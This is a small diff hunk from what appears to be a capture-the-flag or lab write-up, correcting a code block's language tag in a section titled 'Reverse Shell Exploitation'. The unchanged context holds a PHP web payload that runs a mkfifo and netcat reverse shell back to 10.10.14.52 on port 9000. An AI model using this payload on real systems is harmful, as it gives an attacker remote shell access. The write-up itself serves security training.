@@ -89,7 +89,7 @@ www-data wwww-data
 ### 5. Reverse Shell Exploitation
 *We modify our PHP payload to spawn a reverse shell by using Netcat:*
 
-```@php
+```php
 <?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.52 9000 >/tmp/f");?>
 ```
 
